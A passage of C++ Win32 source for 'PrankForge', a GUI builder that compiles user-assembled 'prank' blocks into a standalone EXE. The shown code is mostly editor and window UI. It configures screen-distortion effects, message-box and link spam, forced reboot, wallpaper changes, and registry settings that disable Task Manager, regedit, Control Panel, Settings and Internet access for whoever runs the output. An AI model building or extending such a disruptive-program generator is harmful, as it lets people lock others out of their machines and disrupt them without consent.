        RECT ob={rc.right-130,rc.bottom-55,rc.right-20,rc.bottom-15};
        auto ins=[](const RECT& r,int px,int py){return px>=r.left&&px<=r.right&&py>=r.top&&py<=r.bottom;};
        int nh=-1;
        if(ins(lr,x,y)){int ry=y-lr.top+g_effectSel.scrollY,idx=ry/44;if(idx>=0&&idx<kGdiCount)nh=idx;}
        int nO=ins(ob,x,y),nC=ins(cb,x,y);
        if(nh!=g_effectSel.hovered||nO!=hO||nC!=hC){g_effectSel.hovered=nh;hO=nO;hC=nC;InvalidateRect(h,nullptr,FALSE);}
        if(nh>=0||nO||nC)SetCursor(LoadCursor(nullptr,IDC_HAND));else SetCursor(LoadCursor(nullptr,IDC_ARROW));
        return 0;
    }
    case WM_LBUTTONDOWN:{
        int x=LOWORD(l),y=HIWORD(l);RECT rc;GetClientRect(h,&rc);
        RECT lr={20,60,rc.right-20,rc.bottom-70};
        RECT cb={rc.right-240,rc.bottom-55,rc.right-140,rc.bottom-15};
        RECT ob={rc.right-130,rc.bottom-55,rc.right-20,rc.bottom-15};
        auto ins=[](const RECT& r,int px,int py){return px>=r.left&&px<=r.right&&py>=r.top&&py<=r.bottom;};
        if(ins(lr,x,y)){int ry=y-lr.top+g_effectSel.scrollY,idx=ry/44;
            if(idx>=0&&idx<kGdiCount){g_effectSel.selected=idx;InvalidateRect(h,nullptr,FALSE);}return 0;}
        if(ins(ob,x,y)){if(g_effectSel.selected>=0){Block* b=FindBlockById(g_effectSel.forBlockId);
            if(b){b->gdiEffect=g_effectSel.selected;g_editor.modified=true;}}DestroyWindow(h);return 0;}
        if(ins(cb,x,y)){DestroyWindow(h);return 0;}
        return 0;
    }
    case WM_MOUSEWHEEL:{int d=GET_WHEEL_DELTA_WPARAM(w);g_effectSel.scrollY-=d/2;
        if(g_effectSel.scrollY<0)g_effectSel.scrollY=0;InvalidateRect(h,nullptr,FALSE);return 0;}
    case WM_CLOSE:DestroyWindow(h);return 0;
    }
    return DefWindowProcW(h,m,w,l);
}

void OpenEffectSelector(HWND parent,int blockId,int curEff){
    g_effectSel.parent=parent;g_effectSel.scrollY=0;g_effectSel.hovered=-1;
    g_effectSel.selected=curEff;g_effectSel.forBlockId=blockId;
    int w=500,h=600;
    int px=(GetSystemMetrics(SM_CXSCREEN)-w)/2,py=(GetSystemMetrics(SM_CYSCREEN)-h)/2;
    HWND d=CreateWindowExW(WS_EX_DLGMODALFRAME,CLASS_EFFECTSEL,L"GDI эффекты",
        WS_OVERLAPPED|WS_CAPTION|WS_SYSMENU,px,py,w,h,parent,nullptr,g_hInst,nullptr);
    ShowWindow(d,SW_SHOW);UpdateWindow(d);
}

// ============================================================
// EDITOR
// ============================================================
LRESULT CALLBACK EditorProc(HWND h,UINT m,WPARAM w,LPARAM l){
    static int hS=0,hP=0,hB=0;
    switch(m){
    case WM_CREATE:
        g_editorWnd=h;
        g_editor.propEdit=CreateWindowExW(0,L"EDIT",L"",WS_CHILD|WS_BORDER|ES_AUTOHSCROLL,0,0,100,30,h,(HMENU)1001,g_hInst,nullptr);
        {HFONT f=CreateFontW(13,0,0,0,FW_NORMAL,0,0,0,DEFAULT_CHARSET,0,0,CLEARTYPE_QUALITY,0,L"Segoe UI");
        SendMessageW(g_editor.propEdit,WM_SETFONT,(WPARAM)f,TRUE);}
        SetTimer(h,1,30000,nullptr);
        return 0;
    case WM_TIMER:if(w==1&&g_editor.modified)SaveProject();return 0;
    case WM_PAINT:{
        PAINTSTRUCT ps;HDC dc=BeginPaint(h,&ps);RECT rc;GetClientRect(h,&rc);
        FillRectC(dc,rc,Colors::BG);
        FillRectC(dc,{0,0,rc.right,TOPBAR_H},Colors::BG_DARK);
        std::wstring t=L"⚒ PrankForge — "+g_editor.projectName;
        if(g_editor.modified)t+=L" ●";
        RECT tr={15,0,rc.right-300,TOPBAR_H};DrawTextLeft(dc,t.c_str(),tr,Colors::TEXT,15,true);
        RECT sb={rc.right-280,8,rc.right-180,TOPBAR_H-8};
        DrawCustomButton(dc,sb,L"💾 Сохранить",hS,false);
        FillRectC(dc,{0,TOPBAR_H,SIDEBAR_W,rc.bottom-BOTTOM_H},Colors::BG_DARK);
        RECT st={15,TOPBAR_H+10,SIDEBAR_W-15,TOPBAR_H+40};
        DrawTextLeft(dc,L"Палитра блоков",st,Colors::TEXT,14,true);
        DrawPalette(dc,TOPBAR_H+50,0,SIDEBAR_W);
        RECT cv={SIDEBAR_W,TOPBAR_H,rc.right-PROPS_W,rc.bottom-BOTTOM_H};
        FillRectC(dc,cv,Colors::BG_CANVAS);
        HRGN rg=CreateRectRgn(cv.left,cv.top,cv.right,cv.bottom);SelectClipRgn(dc,rg);
        DrawGrid(dc,cv);DrawConnections(dc);
        for(auto& b:g_editor.blocks)DrawBlock(dc,b);
        SelectClipRgn(dc,nullptr);DeleteObject(rg);
        DrawProperties(dc,h);
        FillRectC(dc,{0,rc.bottom-BOTTOM_H,rc.right,rc.bottom},Colors::BG_DARK);
        wchar_t info[128];swprintf_s(info,L"Блоков: %d    Zoom: %.0f%%",(int)g_editor.blocks.size(),g_editor.zoom*100.0f);
        DrawTextLeft(dc,info,{15,0,rc.right-500,BOTTOM_H},Colors::TEXT_DIM,12,false);
        RECT pb={rc.right-480,12,rc.right-260,BOTTOM_H-12};
        RECT bb={rc.right-250,12,rc.right-15,BOTTOM_H-12};
        DrawCustomButton(dc,pb,L"▶ Предпросмотр",hP,false);
        DrawCustomButton(dc,bb,L"🔨 Собрать EXE",hB,true);
        EndPaint(h,&ps);
        SyncPropEdit(h);
        return 0;
    }
    case WM_COMMAND:
        if(LOWORD(w)==1001&&HIWORD(w)==EN_CHANGE){
            if(g_editor.editBlockId>=0){Block* b=FindBlockById(g_editor.editBlockId);
                if(b){wchar_t bf[2048]={};GetWindowTextW(g_editor.propEdit,bf,2048);
                    switch(g_editor.editField){case 1:b->welcomeText=bf;break;
                        case 2:b->msgText=bf;break;case 3:b->linkURL=bf;break;case 4:b->wpPath=bf;break;}
                    g_editor.modified=true;}}
            return 0;
        }
        return 0;
    case WM_MOUSEMOVE:{
        int x=LOWORD(l),y=HIWORD(l);RECT rc;GetClientRect(h,&rc);
        RECT pb={rc.right-480,12,rc.right-260,BOTTOM_H-12};
        RECT bb={rc.right-250,12,rc.right-15,BOTTOM_H-12};
        RECT sb={rc.right-280,8,rc.right-180,TOPBAR_H-8};
        auto ins=[](const RECT& r,int px,int py){return px>=r.left&&px<=r.right&&py>=r.top&&py<=r.bottom;};
        int np=ins(pb,x,y),nb=ins(bb,x,y),ns=ins(sb,x,y);
        int ch=0;
        if(np!=hP){hP=np;ch=1;}if(nb!=hB){hB=nb;ch=1;}if(ns!=hS){hS=ns;ch=1;}
        if(x<SIDEBAR_W&&y>TOPBAR_H){
            int yy=TOPBAR_H+60,nh=-1;
            for(int i=0;i<BT_COUNT;++i){
                RECT ir={5,yy,SIDEBAR_W-5,yy+36};
                if(ins(ir,x,y)){nh=i;break;}yy+=40;
                if(i==g_editor.expandedCategory)yy+=36;
            }
            if(nh!=g_editor.hoveredCategory){g_editor.hoveredCategory=nh;ch=1;}
        } else if(g_editor.hoveredCategory!=-1){g_editor.hoveredCategory=-1;ch=1;}
        if(g_editor.activeSlider>=0&&g_editor.selectedId>=0){
            Block* b=FindBlockById(g_editor.selectedId);
            if(b&&g_editor.activeSlider<g_editor.sliderCount){
                RECT sr=g_editor.sliderRects[g_editor.activeSlider];
                int v=(x-sr.left)*100/(sr.right-sr.left);if(v<0)v=0;if(v>100)v=100;
                if(b->type==BT_GDI){if(g_editor.activeSlider==0)b->gdiIntensity=v;else if(g_editor.activeSlider==1)b->gdiDuration=v*60/100;}
                else if(b->type==BT_BYTEBEAT&&g_editor.activeSlider==0)b->bbVolume=v;
                else if(b->type==BT_MSGBOX){if(g_editor.activeSlider==0)b->msgCount=1+v*29/100;else if(g_editor.activeSlider==1)b->msgDelay=v*30;}
                else if(b->type==BT_LINK){if(g_editor.activeSlider==0)b->linkCount=1+v*9/100;else if(g_editor.activeSlider==1)b->linkDelay=v*50;}
                else if(b->type==BT_REBOOT&&g_editor.activeSlider==0)b->rebootDelay=v*30/100;
                g_editor.modified=true;ch=1;
            }
        }
        if(g_editor.dragging&&g_editor.dragBlockId>=0){
            POINT p=ScreenToCanvas(x,y);Block* b=FindBlockById(g_editor.dragBlockId);
            if(b){b->x=p.x-g_editor.dragOffsetX;b->y=p.y-g_editor.dragOffsetY;g_editor.modified=true;
                InvalidateRect(h,nullptr,FALSE);return 0;}
        }
        if(ch)InvalidateRect(h,nullptr,FALSE);
        if(np||nb||ns)SetCursor(LoadCursor(nullptr,IDC_HAND));
        else if(g_editor.activeSlider>=0)SetCursor(LoadCursor(nullptr,IDC_HAND));
        else if(x>SIDEBAR_W&&x<rc.right-PROPS_W&&y>TOPBAR_H&&y<rc.bottom-BOTTOM_H){
            if(FindBlockAtScreen(x,y))SetCursor(LoadCursor(nullptr,IDC_SIZEALL));
            else SetCursor(LoadCursor(nullptr,IDC_ARROW));
        } else SetCursor(LoadCursor(nullptr,IDC_ARROW));
        return 0;
    }
    case WM_LBUTTONDOWN:{
        int x=LOWORD(l),y=HIWORD(l);RECT rc;GetClientRect(h,&rc);
        RECT pb={rc.right-480,12,rc.right-260,BOTTOM_H-12};
        RECT bb={rc.right-250,12,rc.right-15,BOTTOM_H-12};
        RECT sb={rc.right-280,8,rc.right-180,TOPBAR_H-8};
        auto ins=[](const RECT& r,int px,int py){return px>=r.left&&px<=r.right&&py>=r.top&&py<=r.bottom;};
        if(ins(sb,x,y)){if(SaveProject())MessageBoxW(h,L"Сохранено.",L"PrankForge",MB_OK);InvalidateRect(h,nullptr,TRUE);return 0;}
        if(ins(bb,x,y)){
            if(g_editor.blocks.empty()){MessageBoxW(h,L"Добавь хотя бы один блок.",L"PrankForge",MB_OK|MB_ICONWARNING);return 0;}
            wchar_t outPath[MAX_PATH];
            swprintf_s(outPath,L"%s\\%s.exe",g_editor.projectPath.c_str(),g_editor.projectName.c_str());
            std::string json=SerializeProjectToJson();
            if(BuildExe(outPath,json)){wchar_t msg[512];swprintf_s(msg,L"Готово!\n\n%s",outPath);
                MessageBoxW(h,msg,L"PrankForge",MB_OK|MB_ICONINFORMATION);}
            else MessageBoxW(h,L"Ошибка сборки.",L"PrankForge",MB_OK|MB_ICONERROR);
            return 0;
        }
        if(ins(pb,x,y)){
            // Предпросмотр — запускаем себя с JSON во временном файле
            if(g_editor.blocks.empty()){MessageBoxW(h,L"Добавь блоки.",L"PrankForge",MB_OK|MB_ICONWARNING);return 0;}
            wchar_t tmpDir[MAX_PATH],tmpExe[MAX_PATH];
            GetTempPathW(MAX_PATH,tmpDir);
            swprintf_s(tmpExe,L"%spf_preview.exe",tmpDir);
            std::string json=SerializeProjectToJson();
            if(BuildExe(tmpExe,json)){
                ShellExecuteW(nullptr,L"open",tmpExe,nullptr,nullptr,SW_SHOW);
            } else MessageBoxW(h,L"Ошибка предпросмотра.",L"PrankForge",MB_OK|MB_ICONERROR);
            return 0;
        }
        if(x<SIDEBAR_W&&y>TOPBAR_H+50){
            int yy=TOPBAR_H+60;
            for(int i=0;i<BT_COUNT;++i){
                RECT ir={5,yy,SIDEBAR_W-5,yy+36};
                if(ins(ir,x,y)){
                    g_editor.expandedCategory=(g_editor.expandedCategory==i)?-1:i;
                    if(g_editor.expandedCategory==i){
                        Block b;b.id=g_editor.nextId++;
                        b.type=(BlockType)i;b.title=(g_language==0)?g_categories[i].ruName:g_categories[i].enName;
                        int cx=(GetCanvasLeft()+GetCanvasRight(h))/2,cy=(GetCanvasTop()+GetCanvasBottom(h))/2;
                        POINT cpt=ScreenToCanvas(cx,cy);
                        b.x=cpt.x-b.w/2+(int)(g_editor.blocks.size()%5)*30;
                        b.y=cpt.y-b.h/2+(int)(g_editor.blocks.size()%5)*30;
                        g_editor.blocks.push_back(b);g_editor.selectedId=b.id;g_editor.modified=true;
                    }
                    InvalidateRect(h,nullptr,TRUE);return 0;
                }
                yy+=40;if(i==g_editor.expandedCategory)yy+=36;
            }
        }
        if(x>rc.right-PROPS_W&&y>TOPBAR_H){
            Block* b=FindBlockById(g_editor.selectedId);
            if(b){
                for(int i=0;i<g_editor.buttonCount;++i){
                    if(ins(g_editor.buttonRects[i],x,y)){
                        if(b->type==BT_GDI&&i==0){OpenEffectSelector(h,b->id,b->gdiEffect);return 0;}
                        if(b->type==BT_BYTEBEAT&&i==0){b->bbTrack=(b->bbTrack+1)%kByteCount;g_editor.modified=true;InvalidateRect(h,nullptr,TRUE);return 0;}
                        if(b->type==BT_MSGBOX){
                            if(i==0)b->msgIcon=(b->msgIcon+1)%4;
                            else if(i==1)b->msgTrajectory=(b->msgTrajectory+1)%5;
                            g_editor.modified=true;InvalidateRect(h,nullptr,TRUE);return 0;
                        }
                        if(b->type==BT_WALLPAPER){
                            if(i==0){b->wpType=(b->wpType+1)%2;g_editor.modified=true;InvalidateRect(h,nullptr,TRUE);return 0;}
                            if(i==1&&b->wpType==1){
                                wchar_t file[MAX_PATH]={};
                                OPENFILENAMEW o={};o.lStructSize=sizeof(o);o.hwndOwner=h;
                                o.lpstrFilter=L"PNG\0*.png\0All\0*.*\0";o.lpstrFile=file;o.nMaxFile=MAX_PATH;
                                o.Flags=OFN_FILEMUSTEXIST|OFN_PATHMUSTEXIST;
                                if(GetOpenFileNameW(&o)){b->wpPath=file;g_editor.modified=true;InvalidateRect(h,nullptr,TRUE);}
                                return 0;
                            }
                        }
                    }
                }
                for(int i=0;i<g_editor.checkboxCount;++i){
                    if(ins(g_editor.checkboxRects[i],x,y)){
                        if(b->type==BT_REGISTRY){
                            switch(i){case 0:b->regTaskMgr=!b->regTaskMgr;break;
                                case 1:b->regRegedit=!b->regRegedit;break;case 2:b->regControlPanel=!b->regControlPanel;break;
                                case 3:b->regSettings=!b->regSettings;break;case 4:b->regInternet=!b->regInternet;break;
                                case 5:b->regWarn=!b->regWarn;break;}
                            g_editor.modified=true;InvalidateRect(h,nullptr,TRUE);
                        }
                        return 0;
                    }
                }
                for(int i=0;i<g_editor.swatchCount;++i){
                    if(ins(g_editor.swatchRects[i],x,y)){b->wpColor=i;g_editor.modified=true;InvalidateRect(h,nullptr,TRUE);return 0;}
                }
                for(int i=0;i<g_editor.sliderCount;++i){
                    if(ins(g_editor.sliderRects[i],x,y)){
                        g_editor.activeSlider=i;RECT sr=g_editor.sliderRects[i];
                        int v=(x-sr.left)*100/(sr.right-sr.left);if(v<0)v=0;if(v>100)v=100;
                        if(b->type==BT_GDI){if(i==0)b->gdiIntensity=v;else if(i==1)b->gdiDuration=v*60/100;}
                        else if(b->type==BT_BYTEBEAT&&i==0)b->bbVolume=v;
                        else if(b->type==BT_MSGBOX){if(i==0)b->msgCount=1+v*29/100;else if(i==1)b->msgDelay=v*30;}
                        else if(b->type==BT_LINK){if(i==0)b->linkCount=1+v*9/100;else if(i==1)b->linkDelay=v*50;}
                        else if(b->type==BT_REBOOT&&i==0)b->rebootDelay=v*30/100;
                        g_editor.modified=true;InvalidateRect(h,nullptr,TRUE);return 0;
                    }
                }
            }
            return 0;
        }
        if(x>SIDEBAR_W&&x<rc.right-PROPS_W&&y>TOPBAR_H&&y<rc.bottom-BOTTOM_H){
            Block* b=FindBlockAtScreen(x,y);
            if(b){g_editor.dragging=true;g_editor.dragBlockId=b->id;
                POINT cpt=ScreenToCanvas(x,y);g_editor.dragOffsetX=cpt.x-b->x;g_editor.dragOffsetY=cpt.y-b->y;
                for(auto& bl:g_editor.blocks)bl.selected=false;
                b->selected=true;g_editor.selectedId=b->id;}
            else{for(auto& bl:g_editor.blocks)bl.selected=false;g_editor.selectedId=-1;}
            InvalidateRect(h,nullptr,TRUE);return 0;
        }
        return 0;
    }
    case WM_LBUTTONUP:g_editor.dragging=false;g_editor.dragBlockId=-1;g_editor.activeSlider=-1;return 0;
    case WM_MOUSEWHEEL:{int d=GET_WHEEL_DELTA_WPARAM(w);bool ctrl=(GetKeyState(VK_CONTROL)&0x8000)!=0;
        if(ctrl){if(d>0)g_editor.zoom*=1.1f;else g_editor.zoom/=1.1f;
            if(g_editor.zoom<0.25f)g_editor.zoom=0.25f;if(g_editor.zoom>3.0f)g_editor.zoom=3.0f;}
        else{g_editor.scrollY-=d/3;if(g_editor.scrollY<0)g_editor.scrollY=0;}
        InvalidateRect(h,nullptr,TRUE);return 0;}
    case WM_KEYDOWN:{
        bool ctrl=(GetKeyState(VK_CONTROL)&0x8000)!=0;
        if(ctrl&&w=='S'){if(SaveProject())MessageBoxW(h,L"Сохранено.",L"PrankForge",MB_OK);InvalidateRect(h,nullptr,TRUE);return 0;}
        if(w==VK_DELETE&&g_editor.selectedId>=0){
            for(auto it=g_editor.blocks.begin();it!=g_editor.blocks.end();++it){
                if(it->id==g_editor.selectedId){g_editor.blocks.erase(it);g_editor.selectedId=-1;g_editor.modified=true;
                    InvalidateRect(h,nullptr,TRUE);break;}}
            return 0;
        }
        return 0;
    }
    case WM_DESTROY:if(g_editor.modified)SaveProject();g_editorWnd=nullptr;return 0;
    }
    return DefWindowProcW(h,m,w,l);
}

void OpenEditor(HWND parent,int idx){
    if(idx<0||idx>=(int)g_projects.size())return;
    g_editor.blocks.clear();g_editor.nextId=1;g_editor.selectedId=-1;
    g_editor.scrollX=0;g_editor.scrollY=0;g_editor.zoom=1.0f;
    g_editor.projectName=g_projects[idx].name;g_editor.projectPath=g_projects[idx].path;
    g_editor.modified=false;
    RECT rc={0,0,1400,800};AdjustWindowRect(&rc,WS_OVERLAPPEDWINDOW,FALSE);
    int w=rc.right-rc.left,h=rc.bottom-rc.top;
    int x=(GetSystemMetrics(SM_CXSCREEN)-w)/2,y=(GetSystemMetrics(SM_CYSCREEN)-h)/2;
    HWND e=CreateWindowExW(0,CLASS_EDITOR,(L"PrankForge — "+g_editor.projectName).c_str(),
        WS_OVERLAPPEDWINDOW,x,y,w,h,parent,nullptr,g_hInst,nullptr);
    ShowWindow(e,SW_SHOW);UpdateWindow(e);
}

// ============================================================
// WELCOME / MAIN / CREATE — UI
// ============================================================
LRESULT CALLBACK WelcomeProc(HWND h,UINT m,WPARAM w,LPARAM l){
    static int hS=0,hR=0,hE=0,hD=0,hA=0,hX=0;
    switch(m){
    case WM_PAINT:{PAINTSTRUCT ps;HDC dc=BeginPaint(h,&ps);RECT rc;GetClientRect(h,&rc);
        FillRectC(dc,rc,Colors::BG);
        FillRectC(dc,{0,0,rc.right,40},Colors::BG_DARK);
        RECT bc={rc.right-40,0,rc.right,40};if(hX)FillRectC(dc,bc,RGB(200,50,50));
        DrawTextCentered(dc,L"✕",bc,Colors::TEXT,16,false);
        DrawTextCentered(dc,L"⚒ PrankForge",{0,100,rc.right,180},Colors::ACCENT,56,true);
        DrawTextCentered(dc,L"Build your chaos.",{0,180,rc.right,220},Colors::TEXT_DIM,18,false);
        DrawTextCentered(dc,(g_language==0)?L"Добро пожаловать в конструктор":L"Welcome to builder",
            {0,260,rc.right,300},Colors::TEXT,22,false);
        RECT sb={rc.right/2-100,430,rc.right/2+100,480};
        DrawCustomButton(dc,sb,(g_language==0)?L"Начать":L"Start",hS,true);
        RECT rb={30,rc.bottom-60,110,rc.bottom-30},eb={120,rc.bottom-60,200,rc.bottom-30};
        DrawCustomButton(dc,rb,L"Русский",hR,g_language==0);
        DrawCustomButton(dc,eb,L"English",hE,g_language==1);
        RECT db={240,rc.bottom-60,360,rc.bottom-30},ab={370,rc.bottom-60,490,rc.bottom-30};
        DrawCustomButton(dc,db,L"Docs",hD,false);
        DrawCustomButton(dc,ab,L"About",hA,false);
        DrawTextCentered(dc,L"v1.0.0",{rc.right-120,rc.bottom-40,rc.right-10,rc.bottom-10},Colors::TEXT_DIM,12,false);
        HPEN pen=CreatePen(PS_SOLID,2,Colors::ACCENT);HPEN op=(HPEN)SelectObject(dc,pen);
        for(int i=0;i<5;++i){int yy=250+i*8;MoveToEx(dc,80,yy,nullptr);
            for(int x=80;x<rc.right-80;x+=10)LineTo(dc,x,yy+(int)(5*sin((x+i*30)*0.05)));}
        SelectObject(dc,op);DeleteObject(pen);
        EndPaint(h,&ps);return 0;}
    case WM_MOUSEMOVE:{int x=LOWORD(l),y=HIWORD(l);RECT rc;GetClientRect(h,&rc);
        RECT sb={rc.right/2-100,430,rc.right/2+100,480},rb={30,rc.bottom-60,110,rc.bottom-30};
        RECT eb={120,rc.bottom-60,200,rc.bottom-30},db={240,rc.bottom-60,360,rc.bottom-30};
        RECT ab={370,rc.bottom-60,490,rc.bottom-30},xb={rc.right-40,0,rc.right,40};
        auto ins=[](const RECT& r,int px,int py){return px>=r.left&&px<=r.right&&py>=r.top&&py<=r.bottom;};
        int ns=ins(sb,x,y),nr=ins(rb,x,y),ne=ins(eb,x,y),nd=ins(db,x,y),na=ins(ab,x,y),nx=ins(xb,x,y);
        if(ns!=hS||nr!=hR||ne!=hE||nd!=hD||na!=hA||nx!=hX){hS=ns;hR=nr;hE=ne;hD=nd;hA=na;hX=nx;InvalidateRect(h,nullptr,FALSE);}
        if(ns||nr||ne||nd||na||nx)SetCursor(LoadCursor(nullptr,IDC_HAND));else SetCursor(LoadCursor(nullptr,IDC_ARROW));
        return 0;}
    case WM_LBUTTONDOWN:{int x=LOWORD(l),y=HIWORD(l);RECT rc;GetClientRect(h,&rc);
        RECT sb={rc.right/2-100,430,rc.right/2+100,480},rb={30,rc.bottom-60,110,rc.bottom-30};
        RECT eb={120,rc.bottom-60,200,rc.bottom-30},xb={rc.right-40,0,rc.right,40};
        auto ins=[](const RECT& r,int px,int py){return px>=r.left&&px<=r.right&&py>=r.top&&py<=r.bottom;};
        if(ins(sb,x,y)){DestroyWindow(h);extern void OpenMainWindow();OpenMainWindow();return 0;}
        if(ins(rb,x,y)){g_language=0;InvalidateRect(h,nullptr,TRUE);return 0;}
        if(ins(eb,x,y)){g_language=1;InvalidateRect(h,nullptr,TRUE);return 0;}
        if(ins(xb,x,y)){PostQuitMessage(0);return 0;}
        return 0;}
    case WM_DESTROY:if(!g_mainWnd)PostQuitMessage(0);return 0;
    }
    return DefWindowProcW(h,m,w,l);
}

HWND g_createEditName=nullptr,g_createEditPath=nullptr;

LRESULT CALLBACK CreateProc(HWND h,UINT m,WPARAM w,LPARAM l){
    static int hB=0,hO=0,hC=0;
    switch(m){
    case WM_PAINT:{PAINTSTRUCT ps;HDC dc=BeginPaint(h,&ps);RECT rc;GetClientRect(h,&rc);
        FillRectC(dc,rc,Colors::BG);
        DrawTextLeft(dc,L"Создание проекта",{20,15,rc.right-20,50},Colors::TEXT,20,true);
        DrawTextLeft(dc,L"Название:",{20,70,rc.right-20,95},Colors::TEXT_DIM,14,false);
        DrawTextLeft(dc,L"Расположение:",{20,140,rc.right-20,165},Colors::TEXT_DIM,14,false);
        RECT bb={rc.right-120,165,rc.right-20,200};DrawCustomButton(dc,bb,L"...",hB,false);
        RECT cb={rc.right-240,rc.bottom-60,rc.right-140,rc.bottom-20};
        RECT ob={rc.right-130,rc.bottom-60,rc.right-20,rc.bottom-20};
        DrawCustomButton(dc,cb,L"Отмена",hC,false);
        DrawCustomButton(dc,ob,L"Создать",hO,true);
        EndPaint(h,&ps);return 0;}
    case WM_CTLCOLOREDIT:{HDC dc=(HDC)w;SetTextColor(dc,Colors::TEXT);SetBkColor(dc,Colors::BG_PANEL);
        static HBRUSH br=CreateSolidBrush(Colors::BG_PANEL);return (LRESULT)br;}
    case WM_CREATE:{
        g_createEditName=CreateWindowExW(0,L"EDIT",L"",WS_CHILD|WS_VISIBLE|WS_BORDER|ES_AUTOHSCROLL,20,100,560,32,h,nullptr,g_hInst,nullptr);
        g_createEditPath=CreateWindowExW(0,L"EDIT",L"",WS_CHILD|WS_VISIBLE|WS_BORDER|ES_AUTOHSCROLL,20,170,440,32,h,nullptr,g_hInst,nullptr);
        HFONT f=CreateFontW(15,0,0,0,FW_NORMAL,0,0,0,DEFAULT_CHARSET,0,0,CLEARTYPE_QUALITY,0,L"Segoe UI");
        SendMessageW(g_createEditName,WM_SETFONT,(WPARAM)f,TRUE);
        SendMessageW(g_createEditPath,WM_SETFONT,(WPARAM)f,TRUE);
        return 0;}
    case WM_MOUSEMOVE:{int x=LOWORD(l),y=HIWORD(l);RECT rc;GetClientRect(h,&rc);
        RECT bb={rc.right-120,165,rc.right-20,200},cb={rc.right-240,rc.bottom-60,rc.right-140,rc.bottom-20};
        RECT ob={rc.right-130,rc.bottom-60,rc.right-20,rc.bottom-20};
        auto ins=[](const RECT& r,int px,int py){return px>=r.left&&px<=r.right&&py>=r.top&&py<=r.bottom;};
        int nb=ins(bb,x,y),nc=ins(cb,x,y),no=ins(ob,x,y);
        if(nb!=hB||nc!=hC||no!=hO){hB=nb;hC=nc;hO=no;InvalidateRect(h,nullptr,FALSE);}
        if(nb||nc||no)SetCursor(LoadCursor(nullptr,IDC_HAND));else SetCursor(LoadCursor(nullptr,IDC_ARROW));
        return 0;}
    case WM_LBUTTONDOWN:{int x=LOWORD(l),y=HIWORD(l);RECT rc;GetClientRect(h,&rc);
        RECT bb={rc.right-120,165,rc.right-20,200},cb={rc.right-240,rc.bottom-60,rc.right-140,rc.bottom-20};
        RECT ob={rc.right-130,rc.bottom-60,rc.right-20,rc.bottom-20};
        auto ins=[](const RECT& r,int px,int py){return px>=r.left&&px<=r.right&&py>=r.top&&py<=r.bottom;};
        if(ins(bb,x,y)){BROWSEINFOW bi={};bi.hwndOwner=h;bi.lpszTitle=L"Папка";bi.ulFlags=BIF_RETURNONLYFSDIRS|BIF_NEWDIALOGSTYLE;
            LPITEMIDLIST p=SHBrowseForFolderW(&bi);if(p){wchar_t b[MAX_PATH];SHGetPathFromIDListW(p,b);
                SetWindowTextW(g_createEditPath,b);CoTaskMemFree(p);}return 0;}
        if(ins(ob,x,y)){wchar_t n[256]={},p[MAX_PATH]={};GetWindowTextW(g_createEditName,n,256);GetWindowTextW(g_createEditPath,p,MAX_PATH);
            if(!wcslen(n)){MessageBoxW(h,L"Введи название.",L"!",MB_OK);return 0;}
            wchar_t pd[MAX_PATH];swprintf_s(pd,L"%s\\%s",p,n);CreateDirectoryW(pd,nullptr);
            wchar_t pf[MAX_PATH];swprintf_s(pf,L"%s\\project.pforge",pd);
            HANDLE f=CreateFileW(pf,GENERIC_WRITE,0,nullptr,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,nullptr);
            if(f!=INVALID_HANDLE_VALUE){const char* j="{\"name\":\"\",\"blocks\":[]}";DWORD wr;
                WriteFile(f,j,(DWORD)strlen(j),&wr,nullptr);CloseHandle(f);}
            ProjectInfo pi;pi.name=n;pi.path=pd;SYSTEMTIME st;GetLocalTime(&st);
            wchar_t d[64];swprintf_s(d,L"%04d-%02d-%02d",st.wYear,st.wMonth,st.wDay);pi.date=d;
            g_projects.push_back(pi);if(g_mainWnd)InvalidateRect(g_mainWnd,nullptr,TRUE);
            DestroyWindow(h);return 0;}
        if(ins(cb,x,y)){DestroyWindow(h);return 0;}
        return 0;}
    case WM_CLOSE:DestroyWindow(h);return 0;
    }
    return DefWindowProcW(h,m,w,l);
}

LRESULT CALLBACK MainProc(HWND h,UINT m,WPARAM w,LPARAM l){
    static int hC=0,hS=0,hP=-1;
    switch(m){
    case WM_PAINT:{PAINTSTRUCT ps;HDC dc=BeginPaint(h,&ps);RECT rc;GetClientRect(h,&rc);
        FillRectC(dc,rc,Colors::BG);
        FillRectC(dc,{0,0,250,rc.bottom},Colors::BG_DARK);
        DrawTextCentered(dc,L"⚒ PrankForge",{0,20,250,70},Colors::ACCENT,22,true);
        const wchar_t* it[]={L"📁 Проекты",L"📋 Шаблоны",L"🎨 Эффекты",L"📜 История"};
        for(int i=0;i<4;++i){RECT ir={10,100+i*45,240,140+i*45};if(i==0)FillRectC(dc,ir,Colors::BG_PANEL);
            DrawTextLeft(dc,it[i],ir,Colors::TEXT,15,false);}
        RECT sb={10,rc.bottom-60,240,rc.bottom-15};DrawCustomButton(dc,sb,L"⚙ Настройки",hS,false);
        FillRectC(dc,{250,0,rc.right,70},Colors::BG_DARK);
        DrawTextLeft(dc,L"Мои проекты",{270,15,500,55},Colors::TEXT,22,true);
        RECT cb={rc.right-280,15,rc.right-20,55};DrawCustomButton(dc,cb,L"+ Создать проект",hC,true);
        int y=100;
        if(g_projects.empty()){
            DrawTextCentered(dc,L"Нет проектов.",{250,rc.bottom/2-40,rc.right,rc.bottom/2+40},Colors::TEXT_DIM,18,false);
        } else {
            for(size_t i=0;i<g_projects.size();++i){
                RECT cd={270,y,rc.right-20,y+90};FillRectC(dc,cd,((int)i==hP)?Colors::BG_HOVER:Colors::BG_PANEL);
                HBRUSH br=CreateSolidBrush(Colors::BORDER);FrameRect(dc,&cd,br);DeleteObject(br);
                DrawTextLeft(dc,g_projects[i].name.c_str(),{cd.left+20,cd.top+10,cd.right-20,cd.top+45},Colors::TEXT,18,true);
                std::wstring inf=g_projects[i].path+L"   ·   "+g_projects[i].date;
                DrawTextLeft(dc,inf.c_str(),{cd.left+20,cd.top+45,cd.right-20,cd.top+80},Colors::TEXT_DIM,13,false);
                y+=100;
            }
        }
        EndPaint(h,&ps);return 0;}
    case WM_MOUSEMOVE:{int x=LOWORD(l),y=HIWORD(l);RECT rc;GetClientRect(h,&rc);
        RECT cb={rc.right-280,15,rc.right-20,55},sb={10,rc.bottom-60,240,rc.bottom-15};
        auto ins=[](const RECT& r,int px,int py){return px>=r.left&&px<=r.right&&py>=r.top&&py<=r.bottom;};
        int nc=ins(cb,x,y),ns=ins(sb,x,y),hp=-1;
        if(x>250){int yy=100;for(size_t i=0;i<g_projects.size();++i){
            RECT cd={270,yy,rc.right-20,yy+90};if(ins(cd,x,y)){hp=(int)i;break;}yy+=100;}}
